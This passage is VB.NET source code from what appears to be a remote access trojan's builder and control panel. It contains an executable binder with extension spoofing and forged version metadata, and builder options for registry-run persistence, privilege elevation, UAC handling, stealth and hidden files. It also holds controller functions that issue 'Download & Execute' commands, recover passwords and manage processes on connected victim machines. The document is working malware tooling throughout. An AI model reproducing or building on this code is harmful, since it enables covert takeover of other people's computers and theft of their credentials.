    Async Function ExeBind(ByVal file1 As String, ByVal file2 As String, ByVal Icon As String) As Task
        Dim source As String
        Modulename = "Bind"
        Dim MyTask As Task(Of String) = GetPage()
        source = Await MyTask
        source = source.Replace("%file1CodedBytes%", random_key(GetRandom(10)))
        source = source.Replace("%file2CodedBytes%", random_key(GetRandom(10)))
        source = source.Replace("%file1Bytes%", random_key(GetRandom(10)))
        source = source.Replace("%file2Bytes%", random_key(GetRandom(10)))
        source = source.Replace("%FileName1%", random_key(GetRandom(10)))
        source = source.Replace("%FileName2%", random_key(GetRandom(10)))
        source = source.Replace(Chr(34) + "Title" + Chr(34), Chr(34) + txtTitle.Text + Chr(34))
        source = source.Replace(Chr(34) + "Description" + Chr(34), Chr(34) + txtDescription.Text + Chr(34))
        source = source.Replace(Chr(34) + "Company" + Chr(34), Chr(34) + txtCompany.Text + Chr(34))
        source = source.Replace(Chr(34) + "Product" + Chr(34), Chr(34) + txtProduct.Text + Chr(34))
        source = source.Replace(Chr(34) + "Copyright" + Chr(34), Chr(34) + txtCopyright.Text + Chr(34))
        source = source.Replace(Chr(34) + "Trademark" + Chr(34), Chr(34) + txtTrademark.Text + Chr(34))
        source = source.Replace("FileVersion(" + Chr(34) + "1.0.0.0" + Chr(34), "FileVersion(" + Chr(34) + txtFileVersion1.Text + "." + txtFileVersion2.Text + "." + txtFileVersion3.Text + "." + txtFileVersion4.Text + Chr(34))
        source = source.Replace("Version(" + Chr(34) + "1.0.0.0" + Chr(34), "Version(" + Chr(34) + txtVersion1.Text + "." + txtVersion2.Text + "." + txtVersion3.Text + "." + txtVersion4.Text + Chr(34))
        source = source.Replace("%file1%", format(IO.File.ReadAllBytes(file1.Replace("." & cmbspoof.Text, ""))))
        source = source.Replace("%file2%", format(IO.File.ReadAllBytes(file2)))
        Try
            File.Delete(file1.Replace("." & cmbspoof.Text, ""))
        Catch : End Try
        iCompiler.GenerateExecutable(file1, source, Icon)
    End Function

    Function GetRandom(ByVal range As Integer)
        Randomize()
        Return CInt(Math.Ceiling(Rnd() * range))
    End Function

    Public Function random_key(ByVal lenght As Integer) As String
        Randomize()
        Dim s As New System.Text.StringBuilder("")
        Dim b() As Char = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function


    Private Sub cmdmutex_Click(sender As Object, e As EventArgs) Handles cmdmutex.Click
        txtMutex.Text = GenerateMutex()
    End Sub

    Private Sub chkHKCU_CheckedChanged(sender As Object, e As EventArgs) Handles chkHKCU.CheckedChanged
        If chkHKCU.Checked = False And cmbRunOnce.Text = "No" Then
            txtstartup.Enabled = False
        Else
            txtstartup.Enabled = True
        End If
    End Sub

    Private Sub chkHKLM_CheckedChanged(sender As Object, e As EventArgs) Handles chkHKLM.CheckedChanged
        If chkHKLM.Checked = False Then
            txtstartupLM.Enabled = False
        Else
            txtstartupLM.Enabled = True
        End If
    End Sub

    Private Sub cmbRunOnce_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cmbRunOnce.SelectedIndexChanged
        If cmbRunOnce.Text = "No" And chkHKCU.Checked = False Then
            txtstartup.Enabled = False
        Else
            txtstartup.Enabled = True
        End If
    End Sub

    Private Sub chkinstall_CheckedChanged(sender As Object, e As EventArgs) Handles chkinstall.CheckedChanged
        RadioButton1.Enabled = chkinstall.Checked
        RadioButton2.Enabled = chkinstall.Checked
        RadioButton3.Enabled = chkinstall.Checked
        If chkHKCU.Checked = False And cmbRunOnce.Text = "No" Or chkinstall.Checked = False Then
            txtstartup.Enabled = False
        Else
            txtstartup.Enabled = True
        End If
        If chkHKLM.Checked = False Or chkinstall.Checked = False Then
            txtstartupLM.Enabled = False
        Else
            txtstartupLM.Enabled = True
        End If
        txtname.Enabled = chkinstall.Checked
        txtFolder.Enabled = chkinstall.Checked
        chkHKCU.Enabled = chkinstall.Checked
        chkHKLM.Enabled = chkinstall.Checked
        cmbRunOnce.Enabled = chkinstall.Checked
    End Sub

    Private Sub cmdLoad_Click(sender As Object, e As EventArgs) Handles cmdLoad.Click
        Dim reader As New modINI
        txtbuildhost.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Connection", "host", "127.0.0.1")
        txtbuildport.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Connection", "port", "777")
        txtbuildpasswd.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Connection", "passwd", "passwd")
        txtbuildgroup.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Connection", "group", "Default")

        chkinstall.Checked = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "install", True)
        chkHKCU.Checked = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "HKCU", True)
        chkHKLM.Checked = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "HKLM", False)
        txtFolder.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "Folder", "Foldername")
        txtstartup.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "startup", "Lizard Client")
        txtstartupLM.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "startupLM", "")
        txtname.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "name", "client.exe")
        cmbRunOnce.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "runonce", "No")

        If reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "installpath", 1) = 1 Then
            RadioButton1.Checked = True
            RadioButton2.Checked = False
            RadioButton3.Checked = False
        ElseIf reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "installpath", 1) = 2 Then
            RadioButton1.Checked = False
            RadioButton2.Checked = True
            RadioButton3.Checked = False
        Else
            RadioButton1.Checked = False
            RadioButton2.Checked = False
            RadioButton3.Checked = True
        End If

        chkpersistance.Checked = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Security", "persistance", False)
        chkcritical.Checked = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Security", "critical", False)
        chkElevate.Checked = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Security", "elevate", False)
        chkUAC.Checked = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Security", "UAC", False)

        chkStealth.Checked = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Stealth", "stealth", False)
        chkHidden.Checked = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Stealth", "hidden", False)
        chkshowhidden.Checked = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Stealth", "showhidden", False)

        chkpump.Checked = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Misc", "pump", False)
        txtsize.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Misc", "size", "50")
        ofdIcon.FileName = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Misc", "icon", "")

        If Not reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Misc", "icon", "") = "" Then
            Dim bm As New Bitmap(reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Misc", "icon", ""))
            imgicon.Image = bm
        End If

        txtTitle.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "title", "")
        txtDescription.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "description", "")
        txtCompany.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "company", "")
        txtProduct.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "Product", "")
        txtCopyright.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "Copyright", "")
        txtTrademark.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "Trademark", "")
        txtFileVersion1.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "vfile1", "1")
        txtFileVersion2.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "vfile2", "0")
        txtFileVersion3.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "vfile3", "0")
        txtFileVersion4.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "vfile4", "0")
        txtVersion1.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "v1", "1")
        txtVersion2.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "v2", "0")
        txtVersion3.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "v3", "0")
        txtVersion4.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "v4", "0")

    End Sub

    Private Sub cmdSave_Click(sender As Object, e As EventArgs) Handles cmdSave.Click
        Dim writer As New modINI
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Connection", "host", txtbuildhost.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Connection", "port", txtbuildport.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Connection", "passwd", txtbuildpasswd.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Connection", "group", txtbuildgroup.Text)

        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "install", chkinstall.Checked)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "HKCU", chkHKCU.Checked)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "HKLM", chkHKLM.Checked)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "Folder", txtFolder.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "startup", txtstartup.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "startupLM", txtstartupLM.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "name", txtname.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "runonce", cmbRunOnce.Text)

        If RadioButton1.Checked = True Then
            writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "installpath", 1)
        ElseIf RadioButton2.Checked = True Then
            writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "installpath", 2)
        Else
            writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Install", "installpath", 3)
        End If

        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Security", "persistance", chkpersistance.Checked)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Security", "critical", chkcritical.Checked)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Security", "elevate", chkElevate.Checked)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Security", "UAC", chkUAC.Checked)

        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Stealth", "stealth", chkStealth.Checked)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Stealth", "hidden", chkHidden.Checked)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Stealth", "showhidden", chkshowhidden.Checked)

        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Misc", "pump", chkpump.Checked)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Misc", "size", txtsize.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Misc", "icon", ofdIcon.FileName)

        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "title", txtTitle.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "description", txtDescription.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "company", txtCompany.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "Product", txtProduct.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "Copyright", txtCopyright.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "Trademark", txtTrademark.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "vfile1", txtFileVersion1.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "vfile2", txtFileVersion2.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "vfile3", txtFileVersion3.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "vfile4", txtFileVersion4.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "v1", txtVersion1.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "v2", txtVersion2.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "v3", txtVersion3.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Profiles\" & cmbProfiles.Text, "Assembly", "v4", txtVersion4.Text)

        GetProfiles()
    End Sub

    Private Sub cmbCommand_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cmbCommand.SelectedIndexChanged
        If cmbCommand.Text <> "Select Command" Then
            cmbWho.Enabled = True
        End If
    End Sub

    Private Sub cmbWho_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cmbWho.SelectedIndexChanged
        If cmbWho.Text <> "" Then
            Dim lvi As New ListViewItem
            Dim par As String = "None"
            lvi.Text = cmbCommand.Text
            lvi.SubItems.Add(cmbWho.Text)
            If cmbCommand.Text = "Download & Execute" Then
                par = InputBox("Directlink including http://", "OnConnect", "http://")
            ElseIf cmbCommand.Text = "Show Messagebox" Then
                par = InputBox("What Text should be shown?", "OnConnect", "Text")
                par = par & ";" & InputBox("What Title should be shown?", "OnConnect", "Title")
            End If
            lvi.SubItems.Add(par)
            lstOnConnect.Items.Add(lvi)
            cmbWho.Enabled = False
            cmbWho.Text = ""
            cmbWho.SelectedItem = Nothing
            cmbCommand.Text = "Select Command"
        End If
    End Sub

    Private Sub DeleteCommandToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteCommandToolStripMenuItem.Click
        For i = 0 To lstOnConnect.SelectedItems.Count - 1
            lstOnConnect.Items(lstOnConnect.SelectedItems(0).Index).Remove()
        Next
    End Sub

    Private Sub DeleteAllCommandsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteAllCommandsToolStripMenuItem.Click
        lstOnConnect.Items.Clear()
    End Sub

    Private Sub btnicon_Click(sender As Object, e As EventArgs) Handles btnicon.Click
        ofdIcon.Filter = "Icon Files|*.ico"
        ofdIcon.FileName = ""
        If ofdIcon.ShowDialog = Windows.Forms.DialogResult.OK Then
            Dim bm As New Bitmap(ofdIcon.FileName)
            imgicon.Image = bm
        End If
    End Sub

    Private Sub imgicon_Click(sender As Object, e As EventArgs) Handles imgicon.Click
        imgicon.Image = Nothing
        ofdIcon.FileName = ""
    End Sub

    Private Sub cmdListen_Click(sender As Object, e As EventArgs) Handles cmdListen.Click
        Try
            Server.Listen(txtPort.Text)
            DataServer.Listen(txtDataPort.Text)
            cmdListen.Enabled = False
            ToolStripStatusLabel5.Visible = False
            ToolStripStatusLabel3.Visible = True
        Catch ex As Exception
        End Try
    End Sub

    Private Sub tmrAlive_Tick(sender As Object, e As EventArgs) Handles tmrAlive.Tick
        Try
            For i = 0 To lstConnections.Items.Count - 1
                SendAnyPacket(lstConnections.Items(i).SubItems(9).Text, CByte(PacketHeader.Alive))
            Next
        Catch : End Try
    End Sub

    Private Async Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        If lstConnections.SelectedItems.Count > 0 Then
            Dim source As String
            Modulename = "Uninstall"
            Dim MyTask As Task(Of String) = GetPage()
            source = Await MyTask


            For Each c As ServerClient In Server.Clients
                If c.EndPoint.ToString = lstConnections.Items(lstConnections.SelectedItems(0).Index).SubItems(9).Text.ToString Then
                    SendCompilePacket(c, source, "", "", "")
                End If
            Next
        End If
    End Sub

    Private Sub PasswordRecoveryToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasswordRecoveryToolStripMenuItem.Click
        If lstConnections.SelectedItems.Count > 0 Then
            Dim ip() As String = lstConnections.SelectedItems(0).SubItems(9).Text.Split(":")
            Dim namer As String = "Control: [" & ip(0) & "] - Socket [" & ip(1) & "]"
            Try
                frm.Add(lstConnections.SelectedItems(0).SubItems(9).Text, New x(namer, lstConnections.SelectedItems(0).SubItems(9).Text))
                Dim f As x = frm(lstConnections.SelectedItems(0).SubItems(9).Text)
                f.TabControlClass1.SelectTab(1)
                frm(lstConnections.SelectedItems(0).SubItems(9).Text) = f
                frm(lstConnections.SelectedItems(0).SubItems(9).Text).Show()
                f.cmdgetPW.PerformClick()
            Catch
                Dim f As x = frm(lstConnections.SelectedItems(0).SubItems(9).Text)
                f.TabControlClass1.SelectTab(1)
                f.cmdgetPW.PerformClick()
                frm(lstConnections.SelectedItems(0).SubItems(9).Text) = f
                frm(lstConnections.SelectedItems(0).SubItems(9).Text).Focus()
            End Try
        End If
    End Sub

    Private Sub ProcessManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ProcessManagerToolStripMenuItem.Click
        If lstConnections.SelectedItems.Count > 0 Then
            Dim ip() As String = lstConnections.SelectedItems(0).SubItems(9).Text.Split(":")
            Dim namer As String = "Control: [" & ip(0) & "] - Socket [" & ip(1) & "]"
            Try
                frm.Add(lstConnections.SelectedItems(0).SubItems(9).Text, New x(namer, lstConnections.SelectedItems(0).SubItems(9).Text))
                Dim f As x = frm(lstConnections.SelectedItems(0).SubItems(9).Text)
                f.TabControlClass1.SelectTab(2)
                frm(lstConnections.SelectedItems(0).SubItems(9).Text) = f
                frm(lstConnections.SelectedItems(0).SubItems(9).Text).Show()
                f.cmdgetProcess.PerformClick()
            Catch
                Dim f As x = frm(lstConnections.SelectedItems(0).SubItems(9).Text)
                f.TabControlClass1.SelectTab(2)
                frm(lstConnections.SelectedItems(0).SubItems(9).Text) = f
                frm(lstConnections.SelectedItems(0).SubItems(9).Text).Focus()
                f.cmdgetProcess.PerformClick()
            End Try
        End If
    End Sub

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        If lstConnections.SelectedItems.Count > 0 Then
            SendAnyPacket(lstConnections.Items(lstConnections.SelectedItems(0).Index).SubItems(9).Text.ToString, CByte(PacketHeader.Ender))
        End If
    End Sub

    Private Sub btnSave_Click(sender As Object, e As EventArgs) Handles btnSave.Click
        Dim writer As New modINI
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "host", txthost.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "port", txtPort.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "dataport", txtDataPort.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "password", txtPasswd.Text)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "startlisten", chkListen.Checked)
        writer.writeIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "checkpw", chkPasswd.Checked)
